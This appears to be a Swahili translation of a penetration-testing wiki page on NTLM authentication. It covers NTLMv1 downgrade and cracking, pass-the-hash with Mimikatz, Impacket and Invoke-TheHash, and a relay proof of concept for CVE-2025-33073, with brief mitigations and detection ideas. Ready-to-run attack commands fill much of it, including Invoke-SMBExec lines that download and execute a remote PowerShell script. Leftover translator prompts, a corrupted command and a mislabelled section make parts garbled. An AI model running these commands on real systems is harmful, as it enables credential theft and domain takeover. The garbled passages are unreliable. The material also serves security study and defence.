# NTLM

{{#include ../../banners/hacktricks-training.md}}


## Taarifa za Msingi

Katika mazingira ambamo **Windows XP na Server 2003** zinafanya kazi, hashes za LM (Lan Manager) hutumiwa, ingawa inatambulika kwa upana kwamba zinaweza kuvunjwa kwa urahisi. Hash maalum ya LM, `AAD3B435B51404EEAAD3B435B51404EE`, inaonyesha hali ambapo LM haitumiki, na inawakilisha hash ya string tupu.

Kwa chaguo-msingi, itifaki ya authentication ya **Kerberos** ndiyo njia kuu inayotumiwa. NTLM (NT LAN Manager) hutumika katika hali maalum: kutokuwepo kwa Active Directory, kutokuwepo kwa domain, Kerberos kutofanya kazi kutokana na configuration isiyo sahihi, au wakati connections zinapojaribiwa kwa kutumia IP address badala ya hostname halali.

Kuwepo kwa header ya **"NTLMSSP"** kwenye network packets huashiria mchakato wa NTLM authentication.

Support ya authentication protocols - LM, NTLMv1, na NTLMv2 - hutolewa na DLL maalum iliyo katika `%windir%\Windows\System32\msv1\_0.dll`.

**Mambo Muhimu**:

- LM hashes ziko hatarini, na LM hash tupu (`AAD3B435B51404EEAAD3B435B51404EE`) huashiria kwamba haitumiki.
- Kerberos ndiyo authentication method ya chaguo-msingi, huku NTLM ikitumika tu katika hali fulani.
- NTLM authentication packets zinaweza kutambuliwa kwa header ya "NTLMSSP".
- LM, NTLMv1, na NTLMv2 protocols zinaungwa mkono na system file `msv1\_0.dll`.

## LM, NTLMv1 na NTLMv2

Unaweza kuangalia na kusanidi protocol itakayotumika:

### GUI

Tekeleza _secpol.msc_ -> Local policies -> Security Options -> Network Security: LAN Manager authentication level. Kuna viwango 6 (kutoka 0 hadi 5).

![LM, NTLMv1 na NTLMv2 - GUI: Tekeleza secpol.msc - Local policies - Security Options - Network Security: LAN Manager authentication level. Kuna viwango 6 (kutoka 0 hadi 5)](<../../images/image (919).png>)

### Registry

Hii itaweka kiwango cha 5:
```
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ /v lmcompatibilitylevel /t REG_DWORD /d 5 /f
```
Thamani zinazowezekana:
```
0 - Send LM & NTLM responses
1 - Send LM & NTLM responses, use NTLMv2 session security if negotiated
2 - Send NTLM response only
3 - Send NTLMv2 response only
4 - Send NTLMv2 response only, refuse LM
5 - Send NTLMv2 response only, refuse LM & NTLM
```
## Mpangilio wa msingi wa uthibitishaji wa NTLM Domain

1. **user** huwasilisha **credentials** zake
2. Mashine ya client **hutuma authentication request** ikituma **domain name** na **username**
3. **server** hutuma **challenge**
4. **client** husimba **challenge** kwa kutumia hash ya password kama key na kuituma kama response
5. **server hutuma** kwa **Domain controller** **domain name, username, challenge na response**. Ikiwa **hakuna** Active Directory iliyosanidiwa au domain name ni jina la server, credentials **hukaguliwa locally**.
6. **domain controller hukagua ikiwa kila kitu kiko sahihi** na hutuma maelezo kwa server

**server** na **Domain Controller** zinaweza kuunda **Secure Channel** kupitia server ya **Netlogon**, kwa kuwa Domain Controller inajua password ya server (iko ndani ya db ya **NTDS.DIT**).

### Mpangilio wa Local NTLM authentication

Authentication ni kama ilivyotajwa **hapo awali, lakini** **server** inajua **hash ya user** anayejaribu kufanya authentication ndani ya faili la **SAM**. Kwa hiyo, badala ya kuuliza Domain Controller, **server hujikagua yenyewe** ili kubaini ikiwa user anaweza kufanya authentication.

### NTLMv1 Challenge

**urefu wa challenge ni bytes 8** na **response ina urefu wa bytes 24**.

**NT hash (16bytes)** imegawanywa katika **sehemu 3 za 7bytes kila moja** (7B + 7B + (2B+0x00\*5)): **sehemu ya mwisho hujazwa zero**. Kisha, **challenge** husimbwa **kando** kwa kila sehemu na **bytes zilizofanyiwa cipher** huunganishwa. Jumla: 8B + 8B + 8B = 24Bytes.

**Matatizo**:

- Ukosefu wa **randomness**
- Sehemu 3 zinaweza **kushambuliwa kando** ili kupata NT hash
- **DES inaweza kuvunjwa**
- Key ya 3º huundwa kila mara kwa **zeros 5**.
- Kwa kupewa **challenge ileile**, **response** itakuwa **ileile**. Kwa hiyo, unaweza kumpa victim string "**1122334455667788**" kama **challenge** na kushambulia response kwa kutumia **precomputed rainbow tables**.

### NTLMv1 attack

Unconstrained delegation si ya kawaida sana katika mazingira ya kisasa, lakini **Print Spooler service** inayoweza kufikiwa bado inaweza kutumiwa vibaya ili kulazimisha authentication kwa host hiyo.

Unaweza kutumia vibaya credentials/sessions ulizonazo tayari kwenye AD ili **kuiomba printer ifanye authentication** dhidi ya **host iliyo chini ya udhibiti wako**. Kisha, ukitumia `metasploit auxiliary/server/capture/smb` au `responder`, unaweza **kuweka authentication challenge kuwa 1122334455667788**, kunasa jaribio la authentication, na ikiwa lilifanywa kwa kutumia **NTLMv1** utaweza **ku-crack**.\
Ikiwa unatumia `responder`, unaweza kujaribu **kutumia flag `--lm`** ili kujaribu **kudowngrade** **authentication**.\
_Note kwamba kwa technique hii authentication lazima ifanywe kwa kutumia NTLMv1 (NTLMv2 si valid)._

Kumbuka kwamba printer itatumia computer account wakati wa authentication, na computer accounts hutumia passwords **ndefu na za random** ambazo **huenda usiweze ku-crack** kwa kutumia **dictionaries** za kawaida. Lakini authentication ya **NTLMv1** **hutumia DES** ([maelezo zaidi hapa](#ntlmv1-challenge)), kwa hiyo kwa kutumia services maalum za ku-crack DES utaweza ku-crack (kwa mfano, unaweza kutumia [https://crack.sh/](https://crack.sh) au [https://ntlmv1.com/](https://ntlmv1.com)).

### NTLMv1 attack with hashcat

NTLMv1 pia inaweza kushambuliwa kwa kutumia [NTLMv1 Multi Tool](https://github.com/evilmog/ntlmv1-multi), ambayo hubadilisha messages zilizonaswa za NTLMv1 kuwa formats zinazofaa kwa Hashcat.<sup>[[1]](#references)</sup>

Amri
```bash
python3 ntlmv1.py --ntlmv1 hashcat::DUSTIN-5AA37877:76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595:1122334455667788
```
Please provide the English Markdown content to translate.
```bash
['hashcat', '', 'DUSTIN-5AA37877', '76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D', '727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595', '1122334455667788']

Hostname: DUSTIN-5AA37877
Username: hashcat
Challenge: 1122334455667788
LM Response: 76365E2D142B5612980C67D057EB9EFEEE5EF6EB6FF6E04D
NT Response: 727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
CT1: 727B4E35F947129E
CT2: A52B9CDEDAE86934
CT3: BB23EF89F50FC595

To Calculate final 4 characters of NTLM hash use:
./ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

To crack with hashcat create a file with the following contents:
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788

To crack with hashcat:
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1

To Crack with crack.sh use the following token
NTHASH:727B4E35F947129EA52B9CDEDAE86934BB23EF89F50FC595
```
Please provide the content to include in the file.
```bash
727B4E35F947129E:1122334455667788
A52B9CDEDAE86934:1122334455667788
```
Endesha hashcat (distributed ni bora kupitia tool kama hashtopolis), kwani vinginevyo hii itachukua siku kadhaa.
```bash
./hashcat -m 14000 -a 3 -1 charsets/DES_full.charset --hex-charset hashes.txt ?1?1?1?1?1?1?1?1
```
Katika hali hii tunajua kwamba password yake ni password, kwa hiyo tutadanganya kwa madhumuni ya demo:
```bash
python ntlm-to-des.py --ntlm b4b9b02e6f09a9bd760f388b67351e2b
DESKEY1: b55d6d04e67926
DESKEY2: bcba83e6895b9d

echo b55d6d04e67926>>des.cand
echo bcba83e6895b9d>>des.cand
```
Sasa tunahitaji kutumia hashcat-utilities kubadilisha funguo za des zilizovunjwa kuwa sehemu za NTLM hash:
```bash
./hashcat-utils/src/deskey_to_ntlm.pl b55d6d05e7792753
b4b9b02e6f09a9 # this is part 1

./hashcat-utils/src/deskey_to_ntlm.pl bcba83e6895b9d
bd760f388b6700 # this is part 2
```
Tafadhali tuma sehemu ya mwisho unayotaka nitafsiri.
```bash
./hashcat-utils/src/ct3_to_ntlm.bin BB23EF89F50FC595 1122334455667788

586c # this is the last part
```
Please provide the English text to translate.
```bash
NTHASH=b4b9b02e6f09a9bd760f388b6700586c
```
### NTLMv2 Challenge

**Urefu wa challenge ni baiti 8** na **majibu 2 hutumwa**: Moja lina urefu wa **baiti 24** na urefu wa **jingine** ni **wa kubadilika**.

**Jibu la kwanza** huundwa kwa kutumia HMAC_MD5 kusimba **string** inayoundwa na **client na domain**, na kutumia kama **key** **hash ya MD4** ya **NT hash**. Kisha, **matokeo** yatatumika kama **key** kusimba **challenge** kwa kutumia HMAC_MD5. Kwenye hii, **client challenge ya baiti 8 itaongezwa**. Jumla: Baiti 24.

**Jibu la pili** huundwa kwa kutumia **thamani kadhaa** (client challenge mpya, **timestamp** ili kuzuia **replay attacks**...)

Ikiwa una **PCAP iliyo na exchange ya successful authentication**, toa domain, username, server challenge, na NTLMv2 response, fomati capture kwa Hashcat, na utumie mode `5600` kujaribu kurejesha password. Mwongozo wa vitendo uliowekwa kwenye archive unaendelea kuhifadhi utaratibu wa kutoa packet fields, huku mifano ya Hashcat ikifafanua format inayokubalika sasa.<sup>[[2]](#references)[[7]](#references)</sup>

## Pass-the-Hash

**Mara tu unapokuwa na hash ya victim**, unaweza kuitumia **kujiwakilisha kama** yeye.\
Unahitaji kutumia **tool** ambayo **itafanya** **NTLM authentication kwa kutumia** hiyo **hash**, au unaweza kuunda **sessionlogon** mpya na **kuingiza** hiyo **hash ndani ya LSASS**, ili **NTLM authentication inapofanywa**, **hash hiyo itumike.** Chaguo la mwisho ndilo mimikatz hufanya.

**Tafadhali kumbuka kwamba unaweza kufanya Pass-the-Hash attacks pia kwa kutumia Computer accounts.**

### **Mimikatz**

**Lazima iendeshwe kama administrator**
```bash
Invoke-Mimikatz -Command '"sekurlsa::pth /user:username /domain:domain.tld /ntlm:NTLMhash /run:powershell.exe"'
```
This huzindua mchakato chini ya mtumiaji wa sasa wa ndani, huku LSASS ikihusisha credentials zilizotolewa na network logon yake ya kutoka. Kisha unaweza kufikia network resources kama mtumiaji huyo aliyepewa, sawa na `runas /netonly`, bila kujua plaintext password.

### Pass-the-Hash kutoka linux

Unaweza kupata code execution kwenye mashine za Windows ukitumia Pass-the-Hash kutoka Linux.\
[**Tazama mifano ya vitendo ya Pass-the-Hash execution.**](../lateral-movement/psexec-and-winexec.md#pass-the-hash)

### Impacket Windows compiled tools

Unaweza kupakua[ impacket binaries for Windows hapa](https://github.com/ropnop/impacket_static_binaries/releases/tag/0.9.21-dev-binaries).

- **psexec_windows.exe** `C:\AD\MyTools\psexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.my.domain.local`
- **wmiexec.exe** `wmiexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local`
- **atexec.exe** (Katika hali hii unahitaji kubainisha command, cmd.exe na powershell.exe si halali kupata interactive shell)`C:\AD\MyTools\atexec_windows.exe -hashes ":b38ff50264b74508085d82c69794a4d8" svcadmin@dcorp-mgmt.dollarcorp.moneycorp.local 'whoami'`
- Kuna Impacket binaries nyingine kadhaa...

### Invoke-TheHash

Unaweza kupata powershell scripts hapa: [https://github.com/Kevin-Robertson/Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash)<sup>[[3]](#references)</sup>

#### Invoke-SMBExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-WMIExec
```bash
Invoke-SMBExec -Target dcorp-mgmt.my.domain.local -Domain my.domain.local -Username username -Hash b38ff50264b74508085d82c69794a4d8 -Command 'powershell -ep bypass -Command "iex(iwr http://172.16.100.114:8080/pc.ps1 -UseBasicParsing)"' -verbose
```
#### Invoke-SMBClient
```bash
Invoke-SMBClient -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 [-Action Recurse] -Source \\dcorp-mgmt.my.domain.local\C$\ -verbose
```
#### Invoke-SMBEnum
```bash
Invoke-SMBEnum -Domain dollarcorp.moneycorp.local -Username svcadmin -Hash b38ff50264b74508085d82c69794a4d8 -Target dcorp-mgmt.dollarcorp.moneycorp.local -verbose
```
#### Invoke-TheHash

Function hii inachanganya modes zilizotangulia. Unaweza kupitisha **several hosts**, kuondoa targets ulizochagua, na kuchagua _SMBExec, WMIExec, SMBClient,_ au _SMBEnum_. Ukichagua **SMBExec** au **WMIExec** bila parameter ya _**Command**_, hukagua tu ikiwa una permissions za kutosha.
```
Invoke-TheHash -Type WMIExec -Target 192.168.100.0/24 -TargetExclude 192.168.100.50 -Username Administ -ty    h F6F38B793DB6A94BA04A52F1D3EE92F0
```
### [Evil-WinRM Pass the Hash](../../network-services-pentesting/5985-5986-pentesting-winrm.md#using-evil-winrm)

### Windows Credentials Editor (WCE)

**Inahitaji kuendeshwa kama administrator**

Tool hii itafanya kitu kilekile kama mimikatz (itarekebisha memory ya LSASS).
```
wce.exe -s <username>:<domain>:<hash_lm>:<hash_nt>
```
### Utekelezaji wa mbali wa Windows kwa mikono kwa kutumia username na password


{{#ref}}
../lateral-movement/
{{#endref}}

## Kutoa credentials kutoka kwa Windows Host

Kwa maelezo zaidi, tazama [**Stealing Windows Credentials**](../stealing-credentials/README.md).

## Internal Monologue attack

Internal Monologue Attack ni mbinu fiche ya kutoa credentials inayomruhusu attacker kupata NTLM hashes kutoka kwenye mashine ya victim **bila kuingiliana moja kwa moja na mchakato wa LSASS**. Tofauti na Mimikatz, ambayo husoma hashes moja kwa moja kutoka kwenye memory na mara nyingi huzuiwa na endpoint security solutions au Credential Guard, attack hii hutumia **local calls kwenda kwenye NTLM authentication package (MSV1_0) kupitia Security Support Provider Interface (SSPI)**. Kwanza attacker **hushusha viwango vya NTLM** (kwa mfano, LMCompatibilityLevel, NTLMMinClientSec, RestrictSendingNTLMTraffic) ili kuhakikisha kuwa NetNTLMv1 inaruhusiwa. Kisha hujifanya kuwa user tokens zilizopo zinazopatikana kutoka kwenye processes zinazoendeshwa na huanzisha NTLM authentication locally ili kuzalisha majibu ya NetNTLMv1 kwa kutumia challenge inayojulikana.<sup>[[4]](#references)</sup>

Baada ya kukamata majibu haya ya NetNTLMv1, attacker anaweza kurejesha NTLM hashes za awali kwa haraka kwa kutumia **precomputed rainbow tables**, na hivyo kuwezesha Pass-the-Hash attacks zaidi kwa ajili ya lateral movement. Muhimu zaidi, Internal Monologue Attack hubaki fiche kwa sababu haitengenezi network traffic, haiinject code, wala kusababisha memory dumps za moja kwa moja, jambo linalofanya iwe vigumu zaidi kwa defenders kuigundua ikilinganishwa na mbinu za kawaida kama Mimikatz.

Ikiwa NetNTLMv1 haikubaliwi—kwa sababu ya security policies zilizolazimishwa, attacker anaweza kushindwa kupata jibu la NetNTLMv1.

Ili kushughulikia hali hii, tool ya Internal Monologue ilisasishwa: hupata server token dynamically kwa kutumia `AcceptSecurityContext()` ili bado **ikamate majibu ya NetNTLMv2** ikiwa NetNTLMv1 itashindwa. Ingawa NetNTLMv2 ni ngumu zaidi ku-crack, bado hufungua njia ya relay attacks au offline brute-force katika hali chache.

PoC inaweza kupatikana kwenye **[https://github.com/eladshamir/Internal-Monologue](https://github.com/eladshamir/Internal-Monologue)**.<sup>[[4]](#references)</sup>

## NTLM Relay and Responder

**Soma mwongozo wenye maelezo zaidi kuhusu jinsi ya kufanya attacks hizo hapa:**


{{#ref}}
../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md
{{#endref}}

## Kuchanganua NTLM challenges kutoka kwenye network capture

**Unaweza kutumia** [**https://github.com/mlgualtieri/NTLMRawUnHide**](https://github.com/mlgualtieri/NTLMRawUnHide)

## NTLM & Kerberos *Reflection* kupitia Serialized SPNs (CVE-2025-33073)

Windows ina mitigations kadhaa zinazojaribu kuzuia *reflection* attacks ambapo NTLM (au Kerberos) authentication inayotoka kwenye host inarelayiwa kurudi kwenye **host hiyo hiyo** ili kupata SYSTEM privileges.

Microsoft ilivunja chains nyingi za public kwa kutumia MS08-068 (SMB→SMB), MS09-013 (HTTP→SMB), MS15-076 (DCOM→DCOM) na patches za baadaye, hata hivyo **CVE-2025-33073** inaonyesha kuwa protections bado zinaweza kuepukwa kwa kutumia vibaya jinsi **SMB client inavyokata Service Principal Names (SPNs)** zilizo na target-info iliyomarshalled (serialized).<sup>[[5]](#references)[[6]](#references)</sup>

### TL;DR ya bug
1. Attacker husajili **DNS A-record** ambayo label yake inaencode marshalled SPN – kwa mfano:
`srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA → 10.10.10.50`
2. Victim analazimishwa ku-authenticate kwenye hostname hiyo (PetitPotam, DFSCoerce, n.k.).
3. SMB client inapopitisha target string `cifs/srv11UWhRCAAAAA…` kwenda kwa `lsasrv!LsapCheckMarshalledTargetInfo`, call ya `CredUnmarshalTargetInfo` **huondoa** serialized blob, na kuacha **`cifs/srv1`**.
4. `msv1_0!SspIsTargetLocalhost` (au Kerberos equivalent) sasa huchukulia target hiyo kuwa *localhost* kwa sababu sehemu fupi ya host inalingana na jina la computer (`SRV1`).
5. Kwa hiyo, server huweka `NTLMSSP_NEGOTIATE_LOCAL_CALL` na kuinject **LSASS’ SYSTEM access-token** kwenye context (kwa Kerberos, SYSTEM-marked subsession key huundwa).
6. Kurelay authentication hiyo kwa `ntlmrelayx.py` **au** `krbrelayx.py` hutoa SYSTEM rights kamili kwenye host hiyo hiyo.<sup>[[5]](#references)</sup>

### Quick PoC
```bash
# Add malicious DNS record
dnstool.py -u 'DOMAIN\\user' -p 'pass' 10.10.10.1 \
-a add -r srv11UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA \
-d 10.10.10.50

# Trigger authentication
PetitPotam.py -u user -p pass -d DOMAIN \
srv11UWhRCAAAAAAAAAAAAAAAAA… TARGET.DOMAIN.LOCAL

# Relay listener (NTLM)
ntlmrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support

# Relay listener (Kerberos) – remove NTLM mechType first
krbrelayx.py -t TARGET.DOMAIN.LOCAL -smb2support
```
### Viraka na Mitigation
* KB patch ya **CVE-2025-33073** inaongeza ukaguzi katika `mrxsmb.sys::SmbCeCreateSrvCall` unaozuia muunganisho wowote wa SMB ambao lengwa lake lina taarifa za marshalled (`CredUnmarshalTargetInfo` ≠ `STATUS_INVALID_PARAMETER`).<sup>[[5]](#references)[[6]](#references)</sup>
* Tekeleza **SMB signing** ili kuzuia reflection hata kwenye hosts ambazo hazijafanyiwa patch.
* Fuatilia DNS records zinazofanana na `*<base64>...*` na zuia coercion vectors (PetitPotam, DFSCoerce, AuthIP...).

### Mawazo ya Detection
* Network captures zenye `NTLMSSP_NEGOTIATE_LOCAL_CALL` ambapo IP ya client ≠ IP ya server.
* Kerberos AP-REQ yenye subsession key na client principal iliyo sawa na hostname.
* Windows Event 4624/4648 SYSTEM logons zinazofuatwa mara moja na remote SMB writes kutoka kwa host hiyo hiyo.<sup>[[5]](#references)</sup>

Kwa **Machi 2026** local reflection variant inayotumia vibaya **SMB arbitrary ports** na **TCP connection reuse** ili kufikia `NT AUTHORITY\SYSTEM`, tazama:

{{#ref}}
../windows-local-privilege-escalation/local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## References
- [1] [evilmog/ntlmv1-multi – NTLMv1 Multitool](https://github.com/evilmog/ntlmv1-multi)
- [2] [Hashcat example hashes – NetNTLMv2 (mode 5600)](https://hashcat.net/wiki/doku.php?id=example_hashes)
- [3] [Kevin-Robertson/Invoke-TheHash – PowerShell Pass The Hash Utilities](https://github.com/Kevin-Robertson/Invoke-TheHash)
- [4] [Internal Monologue Attack: Kupata NTLM Hashes bila Kugusa LSASS](https://github.com/eladshamir/Internal-Monologue)
- [5] [NTLM Reflection is Dead, Long Live NTLM Reflection!](https://www.synacktiv.com/en/publications/ntlm-reflection-is-dead-long-live-ntlm-reflection-an-in-depth-analysis-of-cve-2025)
- [6] [MSRC – CVE-2025-33073](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-33073)
- [7] [Cracking an NTLMv2 Hash – 801Labs (Internet Archive)](https://web.archive.org/web/20211206031936/http://www.801labs.org/research-portal/post/cracking-an-ntlmv2-hash/)
{{#include ../../banners/hacktricks-training.md}}
